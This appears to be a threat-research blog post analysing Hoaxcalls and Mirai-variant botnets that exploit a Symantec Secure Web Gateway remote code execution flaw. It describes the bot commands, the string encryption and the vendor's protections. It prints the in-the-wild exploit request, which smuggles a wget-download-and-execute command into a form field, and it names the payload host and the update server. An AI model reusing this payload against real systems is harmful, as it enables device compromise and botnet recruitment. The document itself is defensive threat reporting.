Executive Summary
As part of Unit 42’s efforts to proactively monitor threats circulating in the wild, I recently came across new Hoaxcalls and Mirai botnet
campaigns targeting a post-authentication Remote Code Execution vulnerability in Symantec Secure Web Gateway 5.0.2.8, which is
a product that became end-of-life (EOL) in 2015 and end-of-support-life (EOSL) in 2019. There is no evidence to support any other
firmware versions are vulnerable at this point in time and these findings have been shared with Symantec. They confirmed the
currently exploited vulnerability is no longer present in Symantec Web Gateway 5.2.8. Symantec also wanted to emphasize the point
that this vulnerability does not impact Secure Web Gateway solutions, including ProxySG and Web Security Services.
The first instance of this vulnerability being exploited surfaced on April 24th, 2020 as part of an evolution of the Hoaxcalls botnet that
was first discovered earlier that same month. This latest version of Hoaxcalls supports additional commands that allow an attacker
greater control on the infected devices, such as the possibility to proxy traffic through them, downloading updates, maintaining
persistence across device restarts, or preventing reboots, and a larger number of DDoS attacks that can be launched. The use of the
exploit in the wild surfaced only a few days after the publication of the vulnerability details, highlighting the fact that the authors of this
particular botnet have been pretty active in testing the effectiveness of new exploits as and when they are made public.
Following that, in the first week of May, I also came across a Mirai variant campaign involving the use of the same exploit, though in
this campaign, the samples themselves don’t contain any DDoS capabilities. Instead, they serve the purpose of propagation using
credential brute force and exploitation of the Symantec Secure Web Gateway RCE vulnerability This blog post provides any
noteworthy technical details on these two campaigns.
Palo Alto Networks customers are protected from this attack: WildFire correctly identifies all related samples as malicious and Threat
Prevention blocks all exploits used by this variant. In addition, AutoFocus customers can track this exploit using the tag
SymantecWebGateway_RCE.

Hoaxcalls Evolution
The Hoaxcalls botnet, an offshoot of the Bashlite/Gafgyt malware family, was first discovered in April 2020, exploiting recently
disclosed vulnerabilities in certain models of Grandstream business telephone IP PBX systems, and Draytek Vigor routers.
A few weeks later, the botnet was found exploiting an unpatched vulnerability impacting Zyxel Cloud CNM SecuManager.
On April 24th, I observed samples of the same botnet incorporating an exploit targeting the EOL’d Symantec Secure Web Gateway
v5.0.2.8, with an HTTP request in the format:
POST /spywall/timeConfig.php HTTP/1.1
User-Agent: XTC
posttime=1585228657&saveForm=Save&timesync=1&ntpserver=http://qweqwe.com;$(wget%20http://plexle.us/Th5xrRAm%20O%20/tmp/viktor%20&&%20chmod%20777%20/tmp/viktor%20&&%20/tmp/viktor);#&timezone=5
As seen in the snippet above, some samples reach out to a URL for a public file upload service (plexle[.]us) where the postexploitation payload is hosted.
A comprehensive list of indicators of compromise (IOCs), along with a timeline of this activity can be found at the end of this post.
While the new version of the Hoaxcalls botnet is very similar to the initial version, to the point that it even uses the same encryption
scheme with the exact same keys, it supports additional commands that allow an attacker greater control on the infected devices
such as the possibility to proxy traffic through them, downloading updates, maintaining persistence across device restarts or
preventing reboots, and a larger number of DDoS attacks that can be launched. These have been detailed below.
Flooder
Commands

Description

SYMANTEC

scan and infect Symantec Secure Web Gateway devices using the RCE described just above.

FASTFLUX

proxy traffic from the device to an address specified by the attacker

UNINSTALL

kill the running malware process

KILLTELNET

kill the telnet service on the device (this is probably to make maintenance of an infected device trickier for
administrators)

LOCKDEVICE

setup a cronjob to ensure the binary is running and maintain persistence across device restarts

UPDATE

delete the existing bot binary, and download an update from 164[.]132.92.180/sh using either wget or tftp (The
update URL was serving a script as seen in Fig 1 below)

MOVE

switch IRC server

IOCTL

disable the watchdog timer to prevent reboots

HTTPCONN

launch HTTP CONNECTION request flood against specified target

HTTPOPTIONS

launch HTTP OPTIONS request flood against specified target

HTTPTRACE

launch HTTP TRACE request flood against specified target

HTTPDELETE

launch HTTP DELETE request flood against specified target

HTTPPUT

launch HTTP PUT request flood against specified target

HTTPPOST

launch HTTP POST request flood against specified target

HTTPHEAD

launch HTTP HEAD request flood against specified target

HTTPGET

launch HTTP GET request flood against specified target

URG

launch URG flood against specified target

PSH

launch PSH flood against specified target

ACK

launch ACK flood against specified target

FIN

launch FIN flood against specified target

2/6

RST

launch RST flood against specified target

SYN

launch SYN flood against specified target

TCP

launch TCP flood against specified target

VSE

launch VSE flood against specified target

Table 1. New Flooder commands
The URL contacted for the update serves a shell script that downloads and executes binaries from attacker-controlled URLs.

Other bot and flooder commands in common with the previous version of the Hoaxcalls botnet have been described in detail
previously.
Mirai Variant
Samples of this campaign surfaced early May, built on the Mirai source code, and are packed with a modified version of UPX by
using a different 4-byte key with the UPX algorithm.
Another deviation from the Mirai source-code is the use of all of ten 8-byte keys that are cumulatively used for a byte-wise string
encryption scheme.
0xDEADBEEF, 0x85DAB8BF, 0xDEEDEEBF, 0xDEABBEAF, 0xDBBD45BF, 0x246584EF, 0x85BFE8BF, 0xD68395BF,
0xDBAAAAAF, 0x0DAABEEF
This is similar to the scheme used by the Hoaxcalls botnet, and has been seen used in previous variants too. However, as has been
clear with previous implementations too, the use of multiple keys does not imply greater encryption complexity, and in this case this
essentially amounts to a byte-wise XOR encryption with 0x5a.
In this campaign, the samples themselves don’t contain any DDoS capabilities, but rather serve the purpose of propagation using
credential brute force and exploitation of the Symantec Secure Web Gateway RCE vulnerability.
Speculation on Exploitation Success

It is worth mentioning that the botnets’ success at exploitation and infection is limited by the following two facts:
1. The Symantec Secure Web Gateway RCE vulnerability being exploited is a post-authentication vulnerability implying the exploit
is only effective for authenticated sessions.
2. The devices being targeted are EOLDproducts from 2012, and installations with newer firmware would not be vulnerable.

Conclusion
In the case of both campaigns, one can assume that their success with this exploit is limited by the post-authentication nature of the
Symantec Secure Web Gateway RCE vulnerability.
Palo Alto Networks customers are protected by:
WildFire, which detects all related samples with malicious verdicts
Threat Prevention, which blocks all exploits used by this variant.
The exploit can be tracked in AutoFocus using the tag SymantecWebGateway_RCE
Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber
Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically
disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.
